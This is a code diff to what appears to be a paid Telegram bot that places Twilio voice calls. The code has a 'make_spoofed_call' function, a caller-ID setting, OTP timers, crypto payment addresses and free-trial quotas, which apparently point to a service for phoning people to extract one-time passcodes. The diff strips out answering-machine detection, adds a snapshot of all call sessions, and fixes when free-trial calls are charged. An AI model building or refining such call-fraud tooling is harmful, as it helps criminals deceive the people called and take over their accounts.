@@ -93,7 +93,7 @@ from config import (
     OWNER_ID, ADMIN_ID, DEVELOPER_IDS,
     FREE_TRIAL_TOTAL, PAYMENT_ADDRESSES,
     LIVE_LISTEN_URL, LIVE_LISTEN_SECRET,
-    DISABLE_TWILIO_VALIDATION, DISABLE_AMD, AMD_ENABLED, DISABLE_DUMMY_BOT,
+    DISABLE_TWILIO_VALIDATION, DISABLE_DUMMY_BOT,
     ABSTRACT_API_KEY,
     RATE_LIMIT_CAPACITY, RATE_LIMIT_REFILL_RATE, RATE_LIMIT_MAX_VIOLATIONS,
     RATE_LIMIT_BASE_BAN_DURATION, RATE_LIMIT_MAX_BAN_DURATION, RATE_LIMIT_BAN_ESCALATION_FACTOR,
@@ -1424,7 +1424,6 @@ def twilio_status():
                     f"✅ Call ended.\n"
                     f"Detected: {event_type}\n"
                     f"CallSid: <code>{call_sid}</code>\n"
-                    f"AMD Result: {answered_by or 'unknown'}"
                 )
                 if not update_call_status_message(call_sid, summary, final=True):
                     kb = types.InlineKeyboardMarkup()
@@ -1436,17 +1435,6 @@ def twilio_status():
     except Exception as e:
         logger.error(f"[ERROR] Error in /twilio/status endpoint: {e}", exc_info=True)
 
-    return Response("OK", status=200)
-
-
-@app.route('/amd_callback', methods=['POST'])
-@twilio_request_logger('/amd_callback')
-def amd_callback():
-    """AMD callback endpoint - intentionally disabled.
-
-    Twilio may POST to this endpoint in some configurations. The handler has
-    been removed to ensure no machine/human detection logic runs.
-    """
     return Response("OK", status=200)
 
 
@@ -1473,6 +1461,10 @@ class _SessionManager:
 
     def cleanup(self, call_sid: str) -> None:
         self._sessions.pop(call_sid, None)
+
+    def all_sessions(self):
+        """Snapshot of all active sessions, keyed by call_sid."""
+        return list(self._sessions.items())
 
 
 _session_manager: _SessionManager | None = None
@@ -1678,7 +1670,6 @@ def get_request_voice_info(call_sid: str, user_id: str = "unknown") -> tuple[str
 # OTP TIMER HELPERS
 # ======================================================================
 _otp_timers = {}
-_async_amd_timers: Dict[str, threading.Timer] = {}
 
 
 def store_otp_timer(call_sid: str, timer: threading.Timer) -> None:
@@ -1702,32 +1693,10 @@ def cancel_otp_timer(call_sid: str) -> None:
             pass
 
 
-def store_amd_cleanup_timer(call_sid: str, timer: threading.Timer) -> None:
-    if not call_sid or not timer:
-        return
-    existing = _async_amd_timers.get(call_sid)
-    if existing is not None:
-        try:
-            existing.cancel()
-        except Exception:
-            pass
-    _async_amd_timers[call_sid] = timer
-
-
-def cancel_amd_cleanup_timer(call_sid: str) -> None:
-    timer = _async_amd_timers.pop(call_sid, None)
-    if timer is not None:
-        try:
-            timer.cancel()
-        except Exception:
-            pass
-
-
 def cleanup_call_session(call_sid: str) -> None:
     if not call_sid:
         return
     cancel_otp_timer(call_sid)
-    cancel_amd_cleanup_timer(call_sid)
     session = get_call_session(call_sid)
     manager = get_session_manager()
     try:
@@ -2515,7 +2484,7 @@ def _safe_caller_id(caller_id: Optional[str]) -> str:
     return cleaned
 
 def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
-                      chat_id: Optional[int] = None, call_record: bool = True, machine_detection: bool = True,
+                      chat_id: Optional[int] = None, call_record: bool = True,
                       **kwargs) -> Optional[str]:
     if not is_twilio_configured():
         logger.error("Twilio not configured")
@@ -2531,14 +2500,6 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
                     old_file.unlink()
             except Exception as cleanup_ex:
                 logger.debug(f"Failed to clear stale record.mp3 for user {user_id}: {cleanup_ex}")
-
-        if DISABLE_AMD:
-            amd_enabled = False
-        else:
-            amd_enabled = bool(machine_detection)
-        amd_param = "Enable" if amd_enabled else None
-        if DISABLE_AMD and machine_detection:
-            logger.info("DISABLE_AMD=true; skipping Twilio async AMD parameters for outbound call.")
 
         call_params = {
             "to": to,
@@ -2565,18 +2526,7 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
             call_params["recording_channels"] = "mono"
             call_params["recording_status_callback_event"] = ["completed"]
         call_params["status_callback_event"] = ["queued", "ringing", "answered", "completed", "busy", "failed", "no-answer", "canceled"]
-        logger.info("Twilio outbound call params: %s", {k: v for k, v in call_params.items() if k not in {'url', 'async_amd_status_callback'}})
-        if amd_param:
-            call_params["machine_detection"] = amd_param
-            call_params["async_amd"] = True
-            call_params["async_amd_status_callback"] = f"{public_base.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
-            if chat_id:
-                call_params["async_amd_status_callback"] += f"&chat_id={quote_plus(str(chat_id))}"
-            call_params["machine_detection_timeout"] = 8
-            call_params["machine_detection_speech_threshold"] = 1800
-            call_params["machine_detection_speech_end_threshold"] = 1200
-            call_params["machine_detection_silence_timeout"] = 3000
-
+        logger.info("Twilio outbound call params: %s", {k: v for k, v in call_params.items() if k != 'url'})
         if caller_id and caller_id != from_number:
             logger.warning(
                 "Ignoring unsupported outbound caller_id override for Twilio call creation: from=%s caller_id=%s",
@@ -2594,8 +2544,6 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
                 "caller_id": caller_id,
                 "webhook_url": webhook_url,
                 "record": call_record,
-                "machine_detection": amd_param,
-                "async_amd": bool(amd_param),
                 "chat_id": chat_id,
                 "status_callback_event": [
                     "queued",
@@ -2609,14 +2557,6 @@ def make_spoofed_call(to: str, from_number: str, caller_id: str, user_id: str,
                 ],
                 "target": to,
             }
-            if amd_param:
-                dispatch_kwargs.update({
-                    "async_amd_status_callback": call_params.get("async_amd_status_callback"),
-                    "machine_detection_timeout": call_params.get("machine_detection_timeout"),
-                    "machine_detection_speech_threshold": call_params.get("machine_detection_speech_threshold"),
-                    "machine_detection_speech_end_threshold": call_params.get("machine_detection_speech_end_threshold"),
-                    "machine_detection_silence_timeout": call_params.get("machine_detection_silence_timeout"),
-                })
             if kwargs:
                 dispatch_kwargs.update(kwargs)
             fut = make_call_and_store_async(**dispatch_kwargs)
@@ -2919,14 +2859,6 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
     if mode_label is None:
         mode_label = "Normal Call"
     try:
-        # Decrement free trial for non-premium users before making the call
-        if not is_premium_user(user_id_str):
-            remaining = decrement_free_call(user_id_str)
-            if remaining < 0:
-                # This should not happen due to callback-level check, but safeguard anyway
-                bot.send_message(chat_id, "❌ Free trial exhausted. Purchase a subscription to continue.")
-                return
-        
         ensure_user_path(user_id_str)
         current_hash = _compute_setup_hash(user_id_str)
         last_hash = read_user_file(user_id_str, "last_setup_hash.txt", "").strip()
@@ -2937,6 +2869,16 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
         if not phonenum or not is_valid_e164(phonenum):
             bot.send_message(chat_id, "❌ Invalid or missing target phone number. Please set the phone number in your call settings.")
             return
+
+        # Decrement free trial ONLY after all the validation guards above have
+        # passed. A call that cannot start (bad phone, already-used setup) must
+        # not burn a free call.
+        if not is_premium_user(user_id_str):
+            remaining = decrement_free_call(user_id_str)
+            if remaining < 0:
+                # This should not happen due to callback-level check, but safeguard anyway
+                bot.send_message(chat_id, "❌ Free trial exhausted. Purchase a subscription to continue.")
+                return
 
         caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
 
